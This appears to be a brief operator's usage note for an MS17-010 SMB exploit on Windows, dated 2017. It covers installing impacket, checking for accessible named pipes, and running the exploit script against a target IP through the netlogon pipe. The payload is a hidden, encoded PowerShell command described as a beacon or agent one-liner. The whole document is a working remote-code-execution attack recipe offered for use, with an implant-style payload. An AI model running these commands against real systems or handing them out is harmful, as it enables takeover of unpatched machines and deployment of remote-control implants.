# 11 Jul 2017
# ms17-010 exploit from: sleepya https://github.com/worawit/MS17-010
# uses bug exploited by eternalromance and eternalsynergy

# Requires impacket: 
git clone https://github.com/CoreSecurity/impacket.git
cd impacket 
python setup.py install

# requires mysmb from sleepya https://github.com/worawit/MS17-010
# put msmb.py in mysmb subdirectory

# check for accessable namebed pipes to use for exploit:
python NamedPipeChecker.py <ip>

# exploit:
# It will run "cmd /c " + what ever is on the command line:  
python CND_MS17-010.py 192.168.25.195 netlogon 'powershell.exe -nop -w hidden -encodedcommand JABD0...beacon or agent oneliner....' 
